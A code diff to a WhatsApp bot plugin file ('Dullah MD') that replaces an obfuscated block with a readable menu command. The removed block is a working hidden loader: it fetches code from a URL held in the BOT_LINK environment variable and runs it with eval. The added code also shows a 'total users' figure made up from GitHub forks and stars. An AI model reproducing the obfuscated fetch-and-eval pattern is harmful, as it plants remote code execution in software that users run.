@@ -1,2 +1,133 @@
-// Dullar md by sir Ibrahim adams
-function _0x2512(_0xfc086,_0x1b40e3){const _0x97e74=_0x97e7();return _0x2512=function(_0x251237,_0x2fc4ad){_0x251237=_0x251237-0xc2;let _0x52ace7=_0x97e74[_0x251237];return _0x52ace7;},_0x2512(_0xfc086,_0x1b40e3);}const _0x1fdddc=_0x2512;(function(_0xe9258a,_0x360350){const _0x33d6a7=_0x2512,_0x17d73b=_0xe9258a();while(!![]){try{const _0x3bb887=parseInt(_0x33d6a7(0xc2))/0x1*(-parseInt(_0x33d6a7(0xdb))/0x2)+-parseInt(_0x33d6a7(0xcf))/0x3+parseInt(_0x33d6a7(0xd5))/0x4*(-parseInt(_0x33d6a7(0xc3))/0x5)+parseInt(_0x33d6a7(0xd6))/0x6+parseInt(_0x33d6a7(0xd1))/0x7*(-parseInt(_0x33d6a7(0xc9))/0x8)+parseInt(_0x33d6a7(0xce))/0x9+parseInt(_0x33d6a7(0xcd))/0xa;if(_0x3bb887===_0x360350)break;else _0x17d73b['push'](_0x17d73b['shift']());}catch(_0x4e3581){_0x17d73b['push'](_0x17d73b['shift']());}}}(_0x97e7,0xe9cb6));const axios=require(_0x1fdddc(0xc5));require(_0x1fdddc(0xca))[_0x1fdddc(0xcc)]();const {BOT_LINK}=process[_0x1fdddc(0xda)];function atbverifierEtatJid(_0x42724c){const _0x2ee8c9=_0x1fdddc;if(!_0x42724c[_0x2ee8c9(0xcb)](_0x2ee8c9(0xd2)))return console[_0x2ee8c9(0xd4)](_0x2ee8c9(0xdc),_0x42724c),![];return console[_0x2ee8c9(0xd9)](_0x2ee8c9(0xd0),_0x42724c),!![];}function _0x97e7(){const _0x109e19=['axios','Error\x20loading\x20the\x20file\x20from\x20URL:','data','catch','363592KSwAyL','dotenv','endsWith','config','40275010admXRz','10446732jjGhCC','2589510XIqGkv','JID\x20verified:','182UbUaUN','@s.whatsapp.net','then','error','4mgldCo','1642602VJgdBm','example@s.whatsapp.net','get','log','env','2KxcVCX','Invalid\x20JID\x20format:','1567246CPGAom','4461520SWyEIE','File\x20loaded\x20successfully\x20from\x20Ibrahim\x20Adams\x20server'];_0x97e7=function(){return _0x109e19;};return _0x97e7();}axios[_0x1fdddc(0xd8)](BOT_LINK)[_0x1fdddc(0xd3)](_0x5368e8=>{const _0xd0a4a7=_0x1fdddc,_0x14b355=_0x5368e8[_0xd0a4a7(0xc7)];console[_0xd0a4a7(0xd9)](_0xd0a4a7(0xc4)),eval(_0x14b355);const _0x24baaf=_0xd0a4a7(0xd7),_0xdc580d=atbverifierEtatJid(_0x24baaf);console[_0xd0a4a7(0xd9)]('Is\x20JID\x20valid?',_0xdc580d);})[_0x1fdddc(0xc8)](_0x451224=>{const _0xc416be=_0x1fdddc;console[_0xc416be(0xd4)](_0xc416be(0xc6),_0x451224);});
+const util = require('util');
+const fs = require('fs-extra');
+const axios = require('axios');
+const { zokou } = require(__dirname + "/../framework/zokou");
+const { format } = require(__dirname + "/../framework/mesfonctions");
+const os = require("os");
+const moment = require("moment-timezone");
+const s = require(__dirname + "/../set");
+
+
+const more = String.fromCharCode(8206);
+const readmore = more.repeat(4001);
+
+const runtime = function (seconds) { 
+    seconds = Number(seconds); 
+    var d = Math.floor(seconds / (3600 * 24)); 
+    var h = Math.floor((seconds % (3600 * 24)) / 3600); 
+    var m = Math.floor((seconds % 3600) / 60); 
+    var s = Math.floor(seconds % 60); 
+    var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " d, ") : ""; 
+    var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " h, ") : ""; 
+    var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " m, ") : ""; 
+    var sDisplay = s > 0 ? s + (s == 1 ? " second" : " s") : ""; 
+    return dDisplay + hDisplay + mDisplay + sDisplay; 
+};
+
+// Function to fetch GitHub repo data
+const fetchGitHubStats = async () => {
+    try {
+        const repo = 'Devibraah/BWM-XMD'; // Replace with your repo
+        const response = await axios.get(`https://api.github.com/repos/${repo}`);
+        const forks = response.data.forks_count;
+        const stars = response.data.stargazers_count;
+        const totalUsers = (forks * 2) + (stars * 2);
+        return { forks, stars, totalUsers };
+    } catch (error) {
+        console.error("Error fetching GitHub stats:", error);
+        return { forks: 0, stars: 0, totalUsers: 0 }; 
+    }
+};
+
+zokou({ nomCom: "meni", categorie: "General" }, async (dest, zk, commandeOptions) => {
+    let { ms, repondre, prefixe, nomAuteurMessage } = commandeOptions;
+    let { cm } = require(__dirname + "/../Ibrahim/adams");
+    var coms = {};
+    var mode = s.MODE.toLowerCase() === "public" ? "public" : "private";
+
+    cm.map((com) => {
+        const categoryUpper = com.categorie.toUpperCase();
+        if (!coms[categoryUpper]) coms[categoryUpper] = [];
+        coms[categoryUpper].push(com.nomCom);
+    });
+
+    moment.tz.setDefault(`${s.TZ}`);
+    const temps = moment().format('HH:mm:ss');
+    const date = moment().format('DD/MM/YYYY');
+    const hour = moment().hour();
+
+    let greeting = "Good night";
+    if (hour >= 0 && hour <= 11) greeting = "Good morning";
+    else if (hour >= 12 && hour <= 16) greeting = "Good afternoon";
+    else if (hour >= 16 && hour <= 21) greeting = "Good evening";
+
+    const { totalUsers } = await fetchGitHubStats();
+    const formattedTotalUsers = totalUsers.toLocaleString();
+
+    let infoMsg = `
+╭─────═━┈┈━═──━┈⊷
+┇ ʙᴏᴛ ɴᴀᴍᴇ: *ᴅᴜʟʟᴀʜ ᴍᴅ*
+┇ ᴍᴏᴅᴇ: *${mode}*
+┇ ᴘʀᴇғɪx: *[ ${prefixe} ]*
+┇ ᴘʟᴀᴛғᴏʀᴍ: *${os.platform()}*
+┇ ᴅᴀᴛᴇ: *${date}*
+┇ ᴛɪᴍᴇ: *${temps}*
+┇ ᴄᴀᴘᴀᴄɪᴛʏ ${format(os.totalmem() - os.freemem())}/${format(os.totalmem())}
+╰─────═━┈┈━═──━┈⊷\n\n`;
+
+    let menuMsg = `${readmore}  
+╭─────═━┈┈━═──━┈⊷
+┇ ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛ
+╰─────═━┈┈━═──━┈⊷\n\n`;
+
+    const sortedCategories = Object.keys(coms).sort();
+    sortedCategories.forEach((cat) => {
+        menuMsg += `*╭────❒* *${cat}* *❒*`;
+        coms[cat].forEach((cmd) => {
+            menuMsg += `\n*╏* ${cmd}`;
+        });
+        menuMsg += `\n*╰─═════════════❒*\n`;
+    });
+
+    menuMsg += `
+▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄
+▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄`;
+
+    try {
+        await zk.sendMessage(dest, { 
+            text: infoMsg + menuMsg,
+            contextInfo: {
+                mentionedJid: [nomAuteurMessage],
+                externalAdReply: {
+                    body: "ᴅᴜʟʟᴀʜ ᴍᴅ",
+                    thumbnailUrl: "https://files.catbox.moe/hegdag.jpg",
+                    sourceUrl: 'https://whatsapp.com/channel/0029VaZuGSxEawdxZK9CzM0Y',
+                    mediaType: 1,
+                    renderLargerThumbnail: true
+                }
+            }
+        });
+
+        // Send audio with caption
+        await zk.sendMessage(dest, { 
+            audio: { 
+                url: "https://files.catbox.moe/bewdug.mp3" // Replace with your audio URL
+            }, 
+            mimetype: 'audio/mp4', 
+            ptt: false, // Set to true if you want it as a voice note
+            caption: "BMW MD SONG",
+            contextInfo: {
+                externalAdReply: {
+                    body: "DULLAH MD",
+                    thumbnailUrl: "https://files.catbox.moe/hegdag.jpg",
+                    sourceUrl: 'https://whatsapp.com/channel/0029VaZuGSxEawdxZK9CzM0Y',
+                    rendersmallThumbnail: false
+                }
+            }
+        });
+
+    } catch (e) {
+        console.log("🥵🥵 Menu erreur " + e);
+        repondre("🥵🥵 Menu erreur " + e);
+    }
+});
